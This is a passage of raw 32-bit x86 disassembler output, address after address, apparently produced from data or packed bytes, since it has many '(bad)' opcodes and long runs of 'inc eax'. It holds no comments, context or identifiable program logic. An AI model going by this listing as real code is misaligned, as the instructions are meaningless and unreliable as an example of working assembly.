  41b77e:	mov    BYTE PTR [esi+ebp*2-0x5d],al
  41b782:	inc    eax
  41b783:	pop    DWORD PTR [eax+eax*2+0x40]
  41b787:	inc    eax
  41b788:	inc    eax
  41b789:	inc    eax
  41b78a:	inc    eax
  41b78b:	int3   
  41b78c:	jne    0x41b7ce
  41b78e:	push   sp
  41b790:	test   ch,0xff
  41b793:	inc    eax
  41b794:	add    eax,0x4f6d2845
  41b799:	inc    ecx
  41b79a:	push   ebx
  41b79b:	and    DWORD PTR [ecx],esp
  41b79d:	sub    al,0x22
  41b79f:	or     BYTE PTR [eax+eax*2+0x4040c100],dh
  41b7a6:	inc    eax
  41b7a7:	inc    eax
  41b7a8:	add    BYTE PTR [eax-0x32],al
  41b7ab:	loope  0x41b7ed
  41b7ad:	sub    esp,DWORD PTR [eax-0x14]
  41b7b0:	bound  eax,QWORD PTR ds:0xbf6dc52e
  41b7b6:	hlt    
  41b7b7:	ins    DWORD PTR es:[edi],dx
  41b7b8:	push   esp
  41b7b9:	retf   
  41b7ba:	clc    
  41b7bb:	loop   0x41b7cd
  41b7bd:	xchg   ebx,eax
  41b7be:	bound  edi,QWORD PTR [eax+0x13bf485c]
  41b7c4:	inc    eax
  41b7c5:	mov    eax,0x40400517
  41b7ca:	inc    eax
  41b7cb:	inc    eax
  41b7cc:	inc    eax
  41b7cd:	inc    eax
  41b7ce:	inc    eax
  41b7cf:	inc    eax
  41b7d0:	inc    DWORD PTR [eax-0x3f]
  41b7d3:	retf   
  41b7d4:	mov    edi,0x48223831
  41b7d9:	retf   
  41b7da:	and    al,0x4e
  41b7dc:	mov    edi,0x52ee30e1
  41b7e1:	(bad)  
  41b7e2:	pop    esp
  41b7e3:	push   es
  41b7e4:	ins    BYTE PTR es:[edi],dx
  41b7e5:	xor    al,BYTE PTR [eax+0x29]
  41b7e8:	gs (bad) 
  41b7ea:	and    eax,ebp
  41b7ec:	aad    0x37
  41b7ee:	xor    al,0xcf
  41b7f0:	mov    ah,0xc
  41b7f2:	ds inc eax
  41b7f4:	inc    eax
  41b7f5:	inc    eax
  41b7f6:	inc    eax
  41b7f7:	inc    eax
  41b7f8:	inc    eax
  41b7f9:	inc    eax
  41b7fa:	inc    eax
  41b7fb:	inc    eax
  41b7fc:	inc    eax
  41b7fd:	bound  eax,QWORD PTR [ebx+ebx*2+0x4a]
  41b801:	and    eax,0xf6a0c05d
  41b806:	inc    ecx
  41b807:	pusha  
  41b808:	inc    eax
  41b809:	faddp  st(4),st
  41b80b:	data16 test al,0x4f
  41b80e:	int3   
  41b80f:	sub    DWORD PTR [edx-0x41],esp
  41b812:	push   ds
  41b813:	inc    eax
  41b814:	imul   esp,DWORD PTR [edx+esi*1+0x32514065],0x40404010
  41b81f:	inc    eax
  41b820:	inc    eax
  41b821:	inc    eax
  41b822:	inc    eax
  41b823:	inc    eax
  41b824:	add    BYTE PTR [edi],bh
  41b826:	or     eax,0x417d63fa
  41b82b:	test   al,0x6b
  41b82d:	bound  eax,QWORD PTR [ebx-0x41]
  41b830:	popf   
  41b831:	inc    eax
  41b832:	dec    ebx
  41b833:	adc    DWORD PTR [ebp-0x48],ecx
  41b836:	dec    eax
  41b837:	mov    edi,0x421c25d1
  41b83c:	test   al,0x40
  41b83e:	inc    eax
  41b83f:	inc    eax
  41b840:	inc    eax
  41b841:	inc    eax
  41b842:	inc    eax
  41b843:	and    eax,0x94404040
  41b848:	or     eax,0x2640e3bf
  41b84d:	adc    DWORD PTR [eax],0x5f6acb62
  41b853:	sub    al,0x46
  41b855:	ret    
  41b856:	mov    esp,0x22cd2c10
  41b85b:	inc    eax
  41b85c:	jnp    0x41b8a6
  41b85e:	inc    ecx
  41b85f:	mov    edi,0xf5254446
  41b864:	mov    al,BYTE PTR [ebp+0x40]
  41b867:	inc    eax
  41b868:	inc    eax
  41b869:	inc    eax
  41b86a:	inc    eax
  41b86b:	inc    eax
  41b86c:	inc    eax
  41b86d:	inc    eax
  41b86e:	inc    eax
  41b86f:	inc    eax
  41b870:	push   ds
  41b871:	add    eax,0x64c24147
  41b876:	mov    edi,0xc0cd20d7
  41b87b:	int3   
  41b87c:	addr16 inc edi
  41b87e:	dec    edi
  41b87f:	inc    eax
  41b880:	inc    eax
  41b881:	inc    eax
  41b882:	inc    eax
  41b883:	inc    eax
  41b884:	inc    eax
  41b885:	rol    DWORD PTR [eax+0x40],0xe0
  41b889:	fs inc eax
  41b88b:	mov    ah,0x25
  41b88d:	(bad)  
  41b88e:	(bad)  
  41b88f:	sub    dh,BYTE PTR ds:0xf93dbf91
  41b895:	gs xor BYTE PTR ss:[eax+0x45],cl
  41b89a:	inc    ebx
  41b89b:	sar    DWORD PTR [edi+0x15c8523f],0x40
  41b8a2:	inc    eax
  41b8a3:	add    BYTE PTR [eax+0x40],al
  41b8a6:	inc    eax
  41b8a7:	inc    eax
  41b8a8:	inc    eax
  41b8a9:	inc    eax
  41b8aa:	cmp    ebp,esp
  41b8ac:	jnp    0x41b86d
  41b8ae:	in     eax,0x51
  41b8b0:	dec    eax
  41b8b1:	jnp    0x41b917
  41b8b3:	push   0x4144bfcf
  41b8b8:	sbb    dl,BYTE PTR [ecx-0x38]
  41b8bb:	arpl   WORD PTR [ebp+0x68],sp
  41b8be:	popa   
  41b8bf:	cmp    DWORD PTR [esi+0x62e24542],esp
  41b8c5:	lds    ecx,FWORD PTR [edx+esi*8+0x58]
  41b8c9:	dec    ebp
  41b8ca:	cmp    ch,BYTE PTR [ecx-0x4add3690]
  41b8d0:	test   DWORD PTR [eax+0x40],0x40404040
  41b8d7:	inc    eax
  41b8d8:	inc    eax
  41b8d9:	inc    eax
  41b8da:	inc    eax
  41b8db:	xor    al,0x62
  41b8dd:	mov    eax,0xc9f2662
  41b8e2:	pop    es
  41b8e3:	and    eax,0x406c0f1b
  41b8e8:	xor    al,0xb2
  41b8ea:	aaa    
  41b8eb:	xor    al,0x81
  41b8ed:	aas    
  41b8ee:	nop
  41b8ef:	inc    eax
  41b8f0:	sar    DWORD PTR [eax+eax*2+0x40],cl
  41b8f4:	inc    eax
  41b8f5:	inc    eax
  41b8f6:	inc    eax
  41b8f7:	inc    eax
  41b8f8:	int3   
  41b8f9:	jne    0x41b93b
  41b8fb:	das    
  41b8fc:	loopne 0x41b960
  41b8fe:	bound  edi,QWORD PTR [esi+0x40]
  41b901:	mov    ds:0x7e9af01e,al
  41b906:	cmp    BYTE PTR [ebx+ebp*1+0x4c37572f],ah
  41b90d:	sbb    BYTE PTR [ebx+0x65],0xf8
  41b911:	inc    eax
  41b912:	add    cl,al
  41b914:	inc    eax
  41b915:	inc    eax
  41b916:	inc    eax
  41b917:	inc    eax
  41b918:	add    BYTE PTR [eax-0x38],al
  41b91b:	xchg   ecx,eax
  41b91c:	mov    eax,ds:0x69846202
  41b921:	inc    eax
  41b922:	and    al,BYTE PTR [ebp-0x4a]
  41b925:	retf   
  41b926:	jl     0x41b928
  41b928:	sbb    al,0x40
  41b92a:	ins    BYTE PTR es:[edi],dx
  41b92b:	mov    ah,0xf9
  41b92d:	adc    BYTE PTR [eax],ch
  41b92f:	push   ecx
  41b930:	gs inc ecx
  41b932:	inc    edi
  41b933:	bound  esp,QWORD PTR [esi-0x39]
  41b936:	push   esi
  41b937:	fstp   QWORD PTR [esi+0x1b42e270]
  41b93d:	push   edi
  41b93e:	xor    al,0x40
  41b940:	inc    eax
  41b941:	inc    eax
  41b942:	inc    eax
  41b943:	inc    eax
  41b944:	inc    eax
  41b945:	inc    eax
  41b946:	inc    eax
  41b947:	inc    DWORD PTR [eax+0x52]
  41b94a:	stos   DWORD PTR es:[edi],eax
  41b94b:	lods   al,BYTE PTR ds:[esi]
  41b94c:	sub    DWORD PTR [eax],esi
  41b94e:	ror    DWORD PTR [eax],0x1c
  41b951:	int3   
  41b952:	dec    eax
  41b953:	rcl    DWORD PTR [edi+esi*2-0x2],0xcb
  41b958:	mov    edx,0xe0ac544b
  41b95d:	inc    eax
  41b95e:	push   esi
  41b95f:	dec    ebp
  41b960:	ret    
  41b961:	call   0x357852e
  41b966:	inc    eax
  41b967:	inc    eax
  41b968:	inc    eax
  41b969:	inc    eax
  41b96a:	inc    eax
  41b96b:	inc    eax
  41b96c:	inc    eax
  41b96d:	inc    eax
  41b96e:	inc    eax
  41b96f:	inc    eax
  41b970:	lea    edi,[esi]
  41b972:	mov    esi,0x2915b06c
  41b977:	inc    edx
  41b978:	pop    edi
  41b979:	push   es
  41b97a:	add    DWORD PTR [edx+0x15],esi
  41b97d:	inc    ebp
  41b97e:	pop    ebx
  41b97f:	adc    BYTE PTR [edx-0x3573ebd8],bl
  41b985:	inc    eax
  41b986:	loope  0x41b919
  41b988:	ret    
  41b989:	(bad)  
  41b98a:	mul    DWORD PTR [eax+esi*4+0x46]
  41b98e:	dec    eax
  41b98f:	add    DWORD PTR [esi],ebp
  41b991:	and    eax,0x40404048
  41b996:	inc    eax
  41b997:	inc    eax
  41b998:	inc    eax
  41b999:	inc    eax
  41b99a:	inc    eax
  41b99b:	add    BYTE PTR [ebx+0x46],al
  41b99e:	dec    eax
  41b99f:	loopne 0x41b9e8
  41b9a1:	sub    BYTE PTR [ebp+0x70],dh
  41b9a4:	and    BYTE PTR [edx+ebp*2],al
  41b9a7:	and    esi,DWORD PTR [eax-0x63]
  41b9aa:	fs pushf 
  41b9ac:	push   0xffffffdc
  41b9ae:	sbb    eax,0x4cf37548
  41b9b3:	bound  eax,QWORD PTR [eax+0x40]
  41b9b6:	inc    eax
  41b9b7:	inc    eax
  41b9b8:	inc    eax
  41b9b9:	inc    eax
  41b9ba:	and    eax,0xc0404040
  41b9bf:	bound  esp,QWORD PTR [ebp-0x6347bf20]
  41b9c5:	inc    esi
  41b9c6:	lods   eax,DWORD PTR ds:[esi]
  41b9c7:	jp     0x41b994
  41b9c9:	and    DWORD PTR [ebx-0x4f],esp
  41b9cc:	dec    ecx
  41b9cd:	clc    
  41b9ce:	inc    eax
  41b9cf:	inc    eax
  41b9d0:	inc    eax
  41b9d1:	inc    eax
  41b9d2:	inc    eax
  41b9d3:	inc    eax
  41b9d4:	inc    eax
  41b9d5:	inc    eax
  41b9d6:	inc    eax
  41b9d7:	inc    eax
  41b9d8:	push   edx
  41b9d9:	jl     0x41b987
  41b9db:	aaa    
  41b9dc:	inc    eax
  41b9dd:	xchg   esp,eax
  41b9de:	or     DWORD PTR [eax],esi
  41b9e0:	mov    ebx,0x7a6a0562
  41b9e5:	mov    ds:0x333c5da5,al
  41b9ea:	retf   
  41b9eb:	cs push esp
  41b9ed:	add    dl,BYTE PTR [ebx-0x23]
  41b9f0:	addr16 inc eax
  41b9f2:	inc    eax
  41b9f3:	inc    eax
  41b9f4:	inc    eax
  41b9f5:	inc    eax
  41b9f6:	inc    eax
  41b9f7:	rol    DWORD PTR [eax+0x40],0x46
  41b9fb:	mov    edi,0x4fc6ff2a
  41ba00:	xchg   edx,eax
  41ba01:	addr16 xor eax,0x93012bbf
  41ba07:	push   ss
  41ba08:	cmp    DWORD PTR [eax+0x4ca1bfb0],edx
  41ba0e:	xchg   edx,eax
  41ba0f:	loope  0x41ba46
  41ba11:	arpl   WORD PTR ds:0x94542e4e,di
  41ba17:	arpl   WORD PTR [eax+ebx*1-0x3f],bx
  41ba1b:	test   eax,0x554b6536
  41ba20:	rol    BYTE PTR [eax],1
  41ba22:	mov    al,0x45
  41ba24:	sub    al,0x44
  41ba26:	fwait
  41ba27:	xor    al,0x2d
  41ba29:	dec    edi
  41ba2a:	inc    ecx
  41ba2b:	stos   DWORD PTR es:[edi],eax
  41ba2c:	rcr    DWORD PTR [bx+0x7673],1
  41ba31:	ss jp  0x41b9e0
  41ba34:	and    BYTE PTR [ebp+0x61],cl
  41ba37:	adc    DWORD PTR ds:[ebx],eax
  41ba3a:	les    edx,FWORD PTR ds:0x5b3cdc60
  41ba40:	sub    eax,0x25c963a8
  41ba45:	bound  ebx,QWORD PTR [esp+esi*1-0x3e4fed26]
  41ba4c:	loope  0x41ba8e
  41ba4e:	scas   eax,DWORD PTR es:[edi]
  41ba4f:	dec    esp
  41ba50:	adc    eax,0x2e540dbc
  41ba55:	jge    0x41ba4e
  41ba57:	xor    ch,BYTE PTR [eax]
  41ba59:	inc    ecx
  41ba5a:	retf   
  41ba5b:	inc    ebx
  41ba5c:	loope  0x41ba9f
  41ba5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba5f:	fsubr  DWORD PTR [eax]
  41ba61:	or     eax,0xf73e4849
  41ba66:	xchg   ebp,eax
  41ba67:	jge    0x41ba3f
  41ba69:	nop
  41ba6a:	stos   DWORD PTR es:[edi],eax
  41ba6b:	adc    eax,0x16fef121
  41ba70:	mov    ebp,0x97434262
  41ba75:	cmp    BYTE PTR [ebp+0x2],cl
  41ba78:	push   esi
  41ba79:	push   0x92284077
  41ba7e:	rol    BYTE PTR [edx-0x8],cl
  41ba81:	sub    eax,0x24634238
  41ba86:	xchg   edx,eax
  41ba87:	push   eax
  41ba88:	call   0xce49:0x2b5463dd
  41ba8f:	add    ebp,DWORD PTR [eax-0x5c938b9a]
  41ba95:	push   edx
  41ba96:	fcmovnu st,st(4)
  41ba98:	adc    cl,BYTE PTR [eax-0x24]
  41ba9b:	push   esi
  41ba9c:	sub    bh,BYTE PTR [esp+ecx*2+0x2c]
  41baa0:	inc    ecx
  41baa1:	add    al,0x8f
  41baa3:	stos   DWORD PTR es:[edi],eax
  41baa4:	mov    al,ds:0x4674f654
  41baa9:	jge    0x41ba6f
  41baab:	nop
  41baac:	xor    DWORD PTR [ebp+0x6414645b],edi
  41bab2:	dec    edi
  41bab3:	mov    edi,0x65785640
  41bab8:	int    0xa8
  41baba:	mov    ds:0x3b516048,eax
  41babf:	ins    BYTE PTR es:[edi],dx
  41bac0:	inc    esp
  41bac1:	adc    DWORD PTR [edi],edi
  41bac3:	add    BYTE PTR [ebx],dh
  41bac5:	inc    esp
  41bac6:	icebp  
  41bac7:	arpl   WORD PTR [ecx-0x14],ax
  41baca:	inc    edx
  41bacb:	retf   
  41bacc:	and    esi,DWORD PTR [edi-0x390bb295]
  41bad2:	leave  
  41bad3:	inc    eax
  41bad4:	and    eax,0xe7e8ee40
  41bad9:	bound  esp,QWORD PTR [eax-0x5dab9dc0]
  41badf:	push   edx
  41bae0:	jno    0x41bb0c
  41bae2:	add    eax,0xf8efa348
  41bae7:	adc    DWORD PTR [ecx+0x7f],esp
  41baea:	inc    ecx
  41baeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baec:	adc    esi,DWORD PTR [eax+0x3a]
  41baef:	leave  
  41baf0:	arpl   WORD PTR [ebx],cx
  41baf2:	arpl   WORD PTR [eax-0x4fabbfc0],bp
  41baf8:	mov    al,0x86
  41bafa:	sub    al,0x12
  41bafc:	popa   
  41bafd:	push   eax
  41bafe:	aad    0xfe
  41bb00:	inc    edi
  41bb01:	bound  ecx,QWORD PTR fs:[eax-0x3b]
  41bb05:	js     0x41bb06
  41bb07:	lods   al,BYTE PTR ds:[esi]
  41bb08:	in     eax,dx
  41bb09:	add    eax,0x44ed15a0
  41bb0e:	or     ch,BYTE PTR [ebp-0x57]
  41bb11:	leave  
  41bb12:	inc    ebp
  41bb13:	retf   
  41bb14:	into   
  41bb15:	stc    
  41bb16:	ret    0xf549
  41bb19:	dec    eax
  41bb1a:	lea    ecx,[ebp+0x79]
  41bb1d:	inc    ebp
  41bb1e:	inc    ebp
  41bb1f:	bound  ebp,QWORD PTR [eax-0x3bbd8e88]
  41bb25:	fadd   DWORD PTR [eax+0x4c]
  41bb28:	ret    0x452b
  41bb2b:	cmp    cl,ch
  41bb2d:	jno    0x41bb46
  41bb2f:	cmp    BYTE PTR [ebx-0x3bbf579d],al
  41bb35:	dec    ecx
  41bb36:	push   ebx
  41bb37:	ret    
  41bb38:	(bad)  [ecx-0x2e00d56a]
  41bb3e:	xor    bh,BYTE PTR [eax+edx*2-0x37eff458]
  41bb45:	jp     0x41bb8e
  41bb47:	add    eax,0xac621001
  41bb4c:	xor    eax,0x75cb27f1
  41bb51:	dec    eax
  41bb52:	sub    BYTE PTR ds:0x43c51bc8,al
  41bb58:	push   ss
  41bb59:	add    eax,0x493fcd91
  41bb5e:	stos   DWORD PTR es:[edi],eax
  41bb5f:	adc    BYTE PTR [ecx-0x35],al
  41bb62:	mov    edi,0x4ef13f92
  41bb67:	jl     0x41bba6
  41bb69:	mov    edi,0x5ec9bf6c
  41bb6e:	jbe    0x41bbc2
  41bb70:	ja     0x41bb9c
  41bb72:	or     BYTE PTR [eax+0x33],al
  41bb75:	icebp  
  41bb76:	jg     0x41bb89
  41bb78:	jecxz  0x41bbcb
  41bb7a:	retf   
  41bb7b:	inc    eax
  41bb7c:	ret    
  41bb7d:	jnp    0x41bb5b
  41bb7f:	retf   
  41bb80:	loope  0x41bbc8
  41bb82:	mov    edi,0x49116341
  41bb87:	mov    esp,0x8bf4141
  41bb8c:	inc    edx
  41bb8d:	dec    esp
  41bb8e:	inc    esi
  41bb8f:	or     eax,0xd083c83e
  41bb94:	and    DWORD PTR [ebx],edx
  41bb96:	jmp    0x446127dc
  41bb9b:	retf   
  41bb9c:	push   edi
  41bb9d:	push   eax
  41bb9e:	inc    edx
  41bb9f:	push   cs
  41bba0:	shr    BYTE PTR [ebx-0x6ec6bf58],0x2d
  41bba7:	clc    
  41bba8:	inc    ecx
  41bba9:	mov    eax,0x4c484010
  41bbae:	rcl    DWORD PTR [edx+0x3d],cl
  41bbb1:	jns    0x41bb6b
  41bbb3:	dec    ecx
  41bbb4:	in     eax,dx
  41bbb5:	jnp    0x41bc01
  41bbb7:	add    eax,0x414a9f6d
  41bbbc:	outs   dx,BYTE PTR ds:[esi]
  41bbbd:	adc    al,0x35
  41bbbf:	leave  
  41bbc0:	shl    BYTE PTR [edx+0x74],1
  41bbc3:	test   al,0xb5
  41bbc5:	icebp  
  41bbc6:	sub    al,BYTE PTR [ecx+0x41]
  41bbc9:	bound  eax,QWORD PTR [ecx+edx*1+0x5f]
  41bbcd:	inc    esi
  41bbce:	jecxz  0x41bc06
  41bbd0:	cmp    eax,0x81906228
  41bbd5:	push   ecx
  41bbd6:	fsubr  st(1),st
  41bbd8:	jns    0x41bc25
  41bbda:	inc    edx
  41bbdb:	or     eax,0x6eacbf41
  41bbe0:	dec    edx
  41bbe1:	xor    eax,0x4c02cdd8
  41bbe6:	and    esi,DWORD PTR [esp+edi*2]
  41bbe9:	inc    eax
  41bbea:	push   ebp
  41bbeb:	adc    BYTE PTR [edi+0x7142b219],bh
  41bbf1:	dec    eax
  41bbf2:	arpl   WORD PTR [ecx+0x9],ax
  41bbf5:	inc    ebx
  41bbf6:	data16 lahf 
  41bbf8:	mov    WORD PTR [ecx+0x75],es
  41bbfb:	inc    edx
  41bbfc:	or     DWORD PTR [ebx+0x7e6742db],ebx
  41bc02:	addr16 add al,0x80
  41bc05:	inc    ecx
  41bc06:	and    al,0x24
  41bc08:	xor    DWORD PTR [esi+ecx*2-0x33],edi
  41bc0c:	pmullw mm0,QWORD PTR [edx-0x3f97e01d]
  41bc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc14:	outs   dx,BYTE PTR ds:[esi]
  41bc15:	je     0x41bc07
  41bc17:	dec    esi
  41bc18:	cmp    BYTE PTR [ebp+0x6d],0x15
  41bc1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc1d:	xor    BYTE PTR [ebx],bl
  41bc1f:	std    
  41bc20:	inc    ecx
  41bc21:	fsub   QWORD PTR [ecx]
  41bc23:	retf   
  41bc24:	jae    0x41bca0
  41bc26:	sahf   
  41bc27:	push   0x48a840d8
  41bc2c:	outs   dx,BYTE PTR ds:[esi]
  41bc2d:	pop    esi
  41bc2e:	out    dx,al
  41bc2f:	test   al,0xe4
  41bc31:	dec    esp
  41bc32:	dec    eax
  41bc33:	dec    esi
  41bc34:	mov    ebx,0x41505db3
  41bc39:	sub    al,BYTE PTR [bx+si+0x51]
  41bc3d:	jno    0x41bcab
  41bc3f:	sub    ch,BYTE PTR [eax+0xd4e404e]
  41bc45:	xchg   ecx,eax
  41bc46:	cdq    
  41bc47:	dec    edi
  41bc48:	adc    DWORD PTR [eax],edi
  41bc4a:	inc    eax
  41bc4b:	xor    BYTE PTR [ebp+0x5f],ch
  41bc4e:	fidiv  WORD PTR ds:0x84418341
  41bc54:	ss xor ebx,ecx
  41bc57:	inc    eax
  41bc58:	jge    0x41bc74
  41bc5a:	outs   dx,DWORD PTR ds:[esi]
  41bc5b:	xor    eax,0x40f5b717
  41bc60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc62:	test   eax,0x904202a8
  41bc67:	add    ah,BYTE PTR [edx+0x64]
  41bc6a:	test   al,0x11
  41bc6c:	inc    ebx
  41bc6d:	jno    0x41bbfe
  41bc6f:	push   eax
  41bc70:	pop    ebp
  41bc71:	add    eax,0x2c00a448
  41bc76:	jno    0x41bc4c
  41bc78:	pushf  
  41bc79:	fcomp  DWORD PTR [ebx+0xd]
  41bc7c:	pop    ss
  41bc7d:	push   eax
  41bc7e:	cmp    BYTE PTR [ebp-0x3a],0x18
  41bc82:	fmul   st(3),st
  41bc84:	inc    eax
  41bc85:	xor    BYTE PTR [edi+0x53c810c3],dl
  41bc8b:	outs   dx,BYTE PTR ds:[esi]
  41bc8c:	jb     0x41bc96
  41bc8e:	mov    edi,0x50633a12
  41bc93:	sub    al,BYTE PTR [ebx+0x30]
  41bc96:	out    0xab,eax
  41bc98:	into   
  41bc99:	adc    al,0x5b
  41bc9b:	jg     0x41bc1d
  41bc9d:	jp     0x41bcbb
  41bc9f:	mov    eax,0x34dd185b
  41bca4:	andps  xmm6,xmm3
  41bca7:	dec    ebp
  41bca8:	iret   
  41bca9:	leave  
  41bcaa:	push   ebx
  41bcab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcac:	inc    eax
  41bcad:	jb     0x41bcd9
  41bcaf:	push   ebx
  41bcb0:	cmp    eax,0x4054c62
  41bcb5:	and    al,0x44
  41bcb7:	xor    BYTE PTR [edi+edi*1],al
  41bcba:	sub    al,0xc9
  41bcbc:	adc    al,0x3d
  41bcbe:	imul   ebx,DWORD PTR [esi-0x24],0xffffff81
  41bcc2:	inc    ebp
  41bcc3:	retf   0x316b
  41bcc6:	hlt    
  41bcc7:	cld    
  41bcc8:	push   eax
  41bcc9:	test   al,0x63
  41bccb:	inc    esp
  41bccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bccd:	xchg   ebp,eax
  41bcce:	sbb    ch,BYTE PTR [edx-0x21]
  41bcd1:	xchg   edx,eax
  41bcd2:	dec    eax
  41bcd3:	inc    ebx
  41bcd4:	jb     0x41bd18
  41bcd6:	rcl    BYTE PTR [ebx-0x77],cl
  41bcd9:	mov    edx,DWORD PTR ds:0xf23f6b48
  41bcdf:	fmul   QWORD PTR [edx+0x62]
  41bce2:	xchg   ecx,eax
  41bce3:	dec    edi
  41bce4:	xchg   edi,eax
  41bce5:	push   esi
  41bce6:	std    
  41bce7:	or     DWORD PTR [ecx+eax*1],ecx
  41bcea:	gs push ebx
  41bcec:	gs xchg ecx,eax
  41bcee:	dec    ebx
  41bcef:	inc    esp
  41bcf0:	imul   edi,DWORD PTR [eax+0x11],0x34
  41bcf4:	xchg   ecx,eax
  41bcf5:	sub    eax,0x637d6768
  41bcfa:	cld    
  41bcfb:	retf   
  41bcfc:	pusha  
  41bcfd:	je     0x41bc84
  41bcff:	dec    eax
  41bd00:	stos   DWORD PTR es:[edi],eax
  41bd01:	pushf  
  41bd02:	bound  edx,QWORD PTR [eax]
  41bd04:	add    bh,BYTE PTR [edx-0x6]
  41bd07:	int3   
  41bd08:	mov    eax,0x6f4ce123
  41bd0d:	inc    edi
  41bd0e:	jnp    0x41bd31
  41bd10:	imul   esi,ecx,0xfffffffc
  41bd13:	mul    edi
  41bd15:	aaa    
  41bd16:	(bad)  
  41bd17:	mov    esp,0x4f4d156b
  41bd1c:	add    DWORD PTR [ecx],0x8062a815
  41bd22:	cmp    BYTE PTR [ebp+ebx*1+0x482b4591],dh
  41bd29:	jle    0x41bd2f
  41bd2b:	inc    ebx
  41bd2c:	dec    edx
  41bd2d:	push   ebp
  41bd2e:	sub    di,sp
  41bd31:	sub    BYTE PTR [eax+0x4c],0x0
  41bd35:	push   ecx
  41bd36:	outs   dx,DWORD PTR ds:[esi]
  41bd37:	mov    ah,0x6a
  41bd39:	mov    ah,0x63
  41bd3b:	int3   
  41bd3c:	outs   dx,DWORD PTR ds:[esi]
  41bd3d:	inc    esp
  41bd3e:	bound  ecx,QWORD PTR ds:0x1941b45b
  41bd44:	inc    eax
  41bd45:	xchg   edx,eax
  41bd46:	inc    edx
  41bd47:	leave  
  41bd48:	(bad)  
  41bd4a:	xchg   esp,eax
  41bd4b:	xor    edi,DWORD PTR [edi+ebp*4+0x56]
  41bd4f:	pusha  
  41bd50:	inc    ebx
  41bd51:	jae    0x41bdba
  41bd53:	ror    DWORD PTR [edi+0x22],1
  41bd56:	stc    
  41bd57:	or     al,ah
  41bd59:	add    BYTE PTR [eax],0x44
  41bd5c:	cdq    
  41bd5d:	inc    ebx
  41bd5e:	sti    
  41bd5f:	retf   
  41bd60:	outs   dx,BYTE PTR ds:[esi]
  41bd61:	xor    al,BYTE PTR [esi+0x79]
  41bd64:	xor    eax,0x15b84b31
  41bd69:	test   ch,al
  41bd6b:	mov    al,0x2
  41bd6d:	dec    edi
  41bd6e:	pop    es
  41bd6f:	inc    esp
  41bd70:	xor    BYTE PTR [ebx+0x4],ah
  41bd73:	inc    ebx
  41bd74:	sub    esi,DWORD PTR [ecx+0x43]
  41bd77:	outs   dx,DWORD PTR ds:[esi]
  41bd78:	mov    ah,0x44
  41bd7a:	add    BYTE PTR [eax+eax*2-0x32],al
  41bd7e:	mov    WORD PTR [edi+ebx*2-0x33cf9c9a],gs
  41bd85:	xchg   esp,eax
  41bd86:	dec    esp
  41bd87:	push   edx
  41bd88:	add    DWORD PTR [ebx+0x6d],esp
  41bd8b:	inc    ebx
  41bd8c:	cs jp  0x41bdc6
  41bd8f:	and    BYTE PTR [edi+0x28],0x78
  41bd93:	cwde   
  41bd94:	mov    ax,ds:0x62b4c5d5
  41bd9a:	bound  eax,QWORD PTR ds:0x40125501
  41bda0:	add    eax,0x52cbb0cd
  41bda5:	inc    edx
  41bda6:	sub    BYTE PTR [esi+0x17bf0cb],dh
  41bdac:	adc    cl,0xa2
  41bdaf:	imul   esi,DWORD PTR [eax+0x1f5448a0],0x417a7638
  41bdb9:	je     0x41bdd1
  41bdbb:	test   DWORD PTR [ebx-0x10],0x19ba4065
  41bdc2:	ret    
  41bdc3:	dec    edi
  41bdc4:	xor    BYTE PTR [edi],0x2f
  41bdc7:	mov    ch,0x20
  41bdc9:	arpl   WORD PTR fs:[esp+esi*1+0x5c679223],si
  41bdd1:	pushf  
  41bdd2:	daa    
  41bdd3:	or     eax,0x2ae0694b
  41bdd8:	xchg   esp,eax
  41bdd9:	add    eax,0xf380cbad
  41bdde:	cld    
  41bddf:	ja     0x41be58
  41bde1:	xchg   ebp,ebx
  41bde3:	mov    esp,0xd1264227
  41bde8:	(bad)  [ecx]
  41bdea:	adc    BYTE PTR ds:0x62c3f42a,al
  41bdf0:	pop    esp
  41bdf1:	inc    ecx
  41bdf2:	inc    esp
  41bdf3:	retf   
  41bdf4:	push   cs
  41bdf5:	and    bl,BYTE PTR [edx+0x72]
  41bdf8:	test   BYTE PTR [esi-0x48],0x31
  41bdfc:	add    edi,DWORD PTR [ebx-0x75]
  41bdff:	sub    al,0x10
  41be01:	ror    dh,1
  41be03:	ss leave 
  41be05:	xor    DWORD PTR [ecx],esp
  41be07:	popa   
  41be08:	dec    esp
  41be09:	arpl   WORD PTR fs:[eax+0xf34281],bx
  41be10:	mov    edx,0x4615f44d
  41be15:	xor    cl,ah
  41be17:	bound  esp,QWORD PTR [esi]
  41be19:	std    
  41be1a:	jl     0x41be97
  41be1c:	add    BYTE PTR ds:0x67b87b06,bh
  41be22:	int    0xc1
  41be24:	push   cs
  41be25:	inc    ecx
  41be26:	sub    DWORD PTR [edi+ebp*8],esi
  41be29:	inc    edx
  41be2a:	arpl   WORD PTR [edx+eax*2-0x30],dx
  41be2e:	inc    BYTE PTR [eax-0x2f]
  41be31:	lods   al,BYTE PTR ds:[esi]
  41be32:	mov    al,0xcb
  41be34:	sub    BYTE PTR ds:0x73b00139,0x48
  41be3b:	mov    al,0x1
  41be3d:	jnp    0x41beb0
  41be3f:	jecxz  0x41be4e
  41be41:	push   esi
  41be42:	in     eax,dx
  41be43:	or     eax,0x632ede40
  41be48:	retf   
  41be49:	push   edi
  41be4a:	push   ecx
  41be4b:	retf   
  41be4c:	or     eax,0x79c9ce53
  41be51:	int    0x72
  41be53:	or     ch,BYTE PTR [eax+0x417fafcc]
  41be59:	fxch   st(1)
  41be5b:	inc    esp
  41be5c:	inc    eax
  41be5d:	push   ecx
  41be5e:	call   0xc2840234
  41be63:	neg    DWORD PTR [edi]
  41be65:	addr16 daa 
  41be67:	pop    ds
  41be68:	shr    BYTE PTR [ebp+0x51424f7e],0x9f
  41be6f:	loopne 0x41bedd
  41be71:	inc    ecx
  41be72:	xor    al,0xb4
  41be74:	add    BYTE PTR [ebx+0x15],ah
  41be77:	test   al,0x70
  41be79:	pusha  
  41be7a:	outs   dx,DWORD PTR ds:[esi]
  41be7b:	dec    esp
  41be7c:	add    esi,DWORD PTR [ecx+0x10a83b9f]
  41be82:	into   
  41be83:	inc    eax
